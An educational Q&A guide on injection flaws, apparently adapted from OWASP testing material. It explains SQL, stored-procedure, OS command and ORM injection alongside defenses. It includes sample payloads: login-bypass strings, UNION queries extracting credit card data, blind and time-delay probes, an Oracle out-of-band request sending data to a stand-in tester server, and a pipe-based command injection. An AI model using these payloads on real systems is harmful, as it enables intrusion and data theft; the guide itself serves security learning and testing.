# Injection

### Links
[OWASP: injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)

[SAST](https://owasp.org/www-community/Source_Code_Analysis_Tools)

[DAST](https://owasp.org/www-community/Vulnerability_Scanning_Tools)

[Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

[Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)

[Testing for ORM Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection)

[Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)

### Questions

<details>
  <summary>What is the injection?</summary>

It is possible to inject data into almost all sources. Injection flaws occur when an attacker can send hostile data. Injection vulnerabilities are very prevalent, particularly in legacy code. SQL, LDAP, XPath or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages and ORM queries often are vulnerable to injection. The injection can result in data loss, corruption, disclosure to unauthorized parties, loss of accountability, or denial of access. Also, the injection can sometimes lead to a complete host takeover.

</details>

<details>
  <summary>When is an application is vulnerable?</summary>

* when user-supplied data is not validated, filtered, or sanitized by the application;

* when dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter;

* when using hostile data within object-relational mapping (ORM) search parameters to extract additional, sensitive records;

* when the SQL or command contains both structure and hostile data in dynamic queries, commands, or stored procedures (directly using).

</details>

<details>
  <summary>How to prevent injection?</summary>

* Use a safe API, which avoids direct using an interpreter entity or provides a parameterized interface or uses Object Relational Mapping Tools (ORMs);

* Use a positive serverside input validation;

* Escape special characters for dynamic queries; 

* Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.

</details>

<details>
  <summary>What tools could help to avoid injection?</summary>

* Static Application Security Testing (SAST)

* Dynamic Application Security Testing (DAST)

</details>

<details>
  <summary>What are the criteria for secure database access?</summary>

* secure queries:

SQL Injection occurs when untrusted user input is dynamically added to a SQL query in an insecure manner, often via basic string concatenation. An attacker can get a foothold on your network by it. The best way of protection is using a programming technique known as query Parameterization. It allows the database to distinguish between code and data.

* secure configuration:

It is possible to use a secure database configuration. Need to be sure that security controls are available from the Database Management System and hosting platform is enabled and properly configured.

* secure authentication:

Authentication should take place only over a secure channel.

* secure communication:

Most DBMS support a set of communications methods - secure and insecure. It is a good practice to use secure communications options.

</details>

<details>
  <summary>What is the ASVS(Application Security Verification Standard)?</summary>

The ASVS provides a basis for testing web application technical security controls and provides developers with a list of requirements for secure development. The requirements are following objectives in mind:

* Use as a metric: provide application developers and application owners with a yardstick that allows assessing the degree of trust in your application;

* Use as guidance: guide security control developers as to what to build into security controls to satisfy application security requirements;

* Use during procurement: provide a basis for specifying application security verification requirements in contracts.

</details>

<details>
  <summary>What are classes of the SQL injection?</summary>

Inband(inside): extract data by the same channel as for injection of the SQL code.

Out-of-band(outside): data is retrieved using a different channel.

Inferential or Blind: there is no actual transfer of data, but the tester can reconstruct the information by sending particular requests and observing the resulting behaviour of the DB Server.

</details>

<details>
  <summary>What are SQL injection techniques?</summary>

It is possible to use five general techniques or their combinations.

Union Operator: use when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set;

Boolean: use Boolean condition(s) to verify whether certain conditions are true or false;

Error based: this technique forces the database to generate an error, giving the attacker or taster information which to refine their injection;

Out-of-band: the technique used to retrieve data using a different channel;

Time delay: use database commands to delay answers in conditional queries. It is useful when an application doesn't provide results, outputs or errors to an attacker.

</details>

<details>
  <summary>What are the types of Defenses?</summary>

Primary Defenses:

1. Use of Prepared Statements (with Parameterized Queries);
2. Use of Stored Procedures;
3. Allow-list Input Validation;
4. Escaping All User Supplied Input.

Additional Defenses:

1. Enforcing Least Privilege;
2. Performing Allow-list Input Validation as a Secondary.

</details>

<details>
  <summary>What are detection techniques?</summary>

Firstly need to understand when the application interacts with a DB Server to access some data. Typical examples:

Authentication forms: if authentication uses a web form, generally, an application will check user credentials;

Search engines: if the SQL query extracts all relevant records from a database, it will be possible to use submitted string;

E-Commerce sites: the products and their characteristics are very likely to be stored in a database.

The tester should check by an input fields list whose values could be used in SQL queries separately.

</details>

<details>
  <summary>What is standard SQL injection testing (Classic SQL injection)?</summary>

Consider the following SQL query:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Suppose we insert the following Username and Password values:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

The query will be:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

If the values was sent by the GET method and if the domain was `www.example.com`, the request would be:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

After a short analysis, we notice that the query returns a value (or a set of values) because the condition has a successful result (OR 1=1).

Another example query is the following:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

The query has two problems: the parentheses and the MD5 hash function. The values could be:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

In this way, we’ll get the following query:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.)
The request URL will be:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

It may return many values. Sometimes, the authentication code verifies that the number of returned records/results is equal to 1. Could be use next values:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

In this way, we create a request like the following:

`http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

</details>

<details>
  <summary>What is standard SQL injection testing (SELECT Statement)?</summary>

Consider the following SQL query:

`SELECT * FROM products WHERE id_product=$id_product`

Consider also the request to a script that executes the query above:

`http://www.example.com/product.php?id=10`

When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. It is possible to try to use the AND and OR operators.

Consider the request:

`http://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:

`http://www.example.com/product.php?id=10 AND 1=1`

</details>

<details>
  <summary>What is standard SQL injection testing (Stacked Queries)?</summary>

If an application uses the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) will be possible to execute multiple queries in one call.

Consider the following SQL query:

`SELECT * FROM products WHERE id_product=$id_product`

A way to exploit the above scenario would be:

`http://www.example.com/product.php?id=10; INSERT INTO users (…)`

This way is possible to execute many queries in a row and independent of the first query.

</details>

<details>
  <summary>How understand what backend database uses?</summary>

The first way to find out what back end database uses is by observing the error returned by the application. The following are some examples of error messages:

MySql:

  You have an error in your SQL syntax; check the manual
  that corresponds to your MySQL server version for the
  right syntax to use near '\'' at line 1

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

  ORA-00933: SQL command not properly ended
  MS SQL Server:
  Microsoft SQL Native Client error ‘80040e14’
  Unclosed quotation mark after the character string

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1`

PostgreSQL:

  Query failed: ERROR: syntax error at or near
  "’" at character 56 in /www/site/test.php on line 121.

If there is no error message or a custom error message, the tester can inject it into string fields using varying concatenation techniques.

</details>

<details>
  <summary>How understand what backend database uses (Union Exploitation Technique)?</summary>

The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original one. It allows obtaining values from other tables. Look at the following example:

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

We will set the following $id value:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

We will have the following query:

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

The keyword ALL is necessary to get around queries that use the keyword DISTINCT. Moreover, we notice that beyond the credit card numbers, we have selected two other values. They allow avoiding a syntax error.

The first detail a tester needs to exploit the SQL injection vulnerability using the technique is to find the correct numbers of columns in the SELECT statement.

The tester can use ORDER BY clause followed by a number indicating the numeration of the column selected:

`http://www.example.com/product.php?id=10 ORDER BY 10--`

After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were three columns in the example above, the tester could try each column type, using the NULL value to help them:

`http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

If the query fails, the tester will probably see a message like:

  All cells in a column must have the same datatype
  If the query executes with success, the first column can be an integer. Then the tester can move further and so on:

`http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

After gathering successful information, the application may only show one line of the result because the application treats only the first line. It is possible to use a LIMIT clause or the tester can set an invalid value, making only the second query valid:

`http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

</details>

<details>
  <summary>How understand what backend database uses (Boolean Exploitation Technique)?</summary>

The technique is well during blind SQL Injection if the tester cannot get information about a database from an outcome. For example, if a programmer has created a custom error page that does not provide information from a database.

The method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. Consider the www.example.com domain and suppose that it contains a parameter named id vulnerable to SQL injection. It means that carrying out the following request:

`http://www.example.com/index.php?id=1'`

Suppose that the database query would be:

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. It is possible to present in practically every database using some standard functions. For our examples:

* SUBSTRING (text, start, length);
* ASCII (char);
* LENGTH (text).

As an example, we will use the following value for Id:

`$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

That creates the following query:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. But it could be a problem to understand which way could distinguish tests returning a true value from those that return false. Create the query that always returns true:

`$Id=1' AND '1' = '2`

Which will create the following query:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

It is possible to get length of the field:

`$Id=1' AND LENGTH(username)=N AND '1' = '1`

Where N is the number of characters that we have analyzed up to now:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'`

The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.

</details>

<details>
  <summary>How understand what backend database uses (Error Based Exploitation Technique)?</summary>

The technique could be used by a tester when he cannot use one of the other techniques. The point is data extraction from the database by error messages.

Consider the following SQL query:

`SELECT * FROM products WHERE id_product=$id_product`

Consider also the request to a script that executes the query above:

`http://www.example.com/product.php?id=10`

The malicious request would be (e.g. Oracle 10g):

`http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

In this example, the tester is concatenating the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME. This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:

`ORA-292257: host SCOTT unknown`

Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.

</details>

<details>
  <summary>How understand what backend database uses (Out of Band Exploitation Technique)?</summary>

The technique consists of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server.

Consider the following SQL query:

`SELECT * FROM products WHERE id_product=$id_product`

Consider also the request to a script that executes the query above:

`http://www.example.com/product.php?id=10`

The malicious request would be:

`http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

UTL_HTTP.request function will try to connect to the fake server and make an HTTP GET request containing the return from the query: SELECT user FROM DUAL.

</details>

<details>
  <summary>How understand what backend database uses (Time Delay Exploitation Technique)?</summary>

The technique consists in sending an injected query. If the conditional was true, the tester would monitor the server response time. 

Consider the following SQL query:

`SELECT * FROM products WHERE id_product=$id_product`

Consider also the request to a script that executes the query above:

`http://www.example.com/product.php?id=10`

The malicious request would be (e.g. MySql 5.x):

`http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

In this example the tester checks whether the MySql version is 5.x or not, making the server sleep for 10 seconds. The tester can increase the delay time and monitor the responses.

</details>

<details>
  <summary>What is a stored procedure injection?</summary>

When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.

Consider the following SQL Server Stored Procedure:

  Create procedure user_login @username varchar(20), @passwd varchar(20)
  As
  Declare @sqlstring varchar(250)
  Set @sqlstring  = ‘
  Select 1 from users
  Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
  exec(@sqlstring)
  Go

User input:

`anyusername or 1=1'`

`anypassword`

This procedure does not sanitize the input and allow the return value to show an existing record with these parameters.

</details>

<details>
  <summary>What is OS command injection?</summary>

OS command injection is a technique used via a web interface to execute OS commands on a web server. Any web interface that does not sanitize data is subject to this exploit.

</details>

<details>
  <summary>How to test command injection?</summary>

When viewing a file in a web application, often the filename is in the URL. Perl allows piping data from a process into an open statement. The user can append the Pipe symbol | onto the end of the filename.

Example URL before alteration:

`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`

Example URL modified:

`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

It would execute the command /bin/ls.

</details>

<details>
  <summary>What special characters are possible to use for command injection?</summary>

The following special character can be used for command injection such as | ; & $ > < ' !

* cmd1|cmd2 : Uses of | will make command 2 to be executed weather command 1 execution is successful or not.
* cmd1;cmd2 : Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.
* cmd1||cmd2 : Command 2 will only be executed if command 1 execution fails.
* cmd1&&cmd2 : Command 2 will only be executed if command 1 execution succeeds.
* $(cmd) : For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
* cmd : It’s used to execute specific command. For example, whoami
* >(cmd): >(ls)
* <(cmd): <(ls)

</details>

<details>
  <summary>What is ORM injection?</summary>

Object-relational mapping (ORM) Injection use SQL Injection in ORM generated data access object model.

</details>

<details>
  <summary>How to test ORM injection?</summary>

ORM layers can be prone to vulnerabilities as they extend the surface of the attack. Instead of directly targeting the application with SQL queries, you’d be focusing on abusing the ORM layer to send malicious SQL queries.

</details>
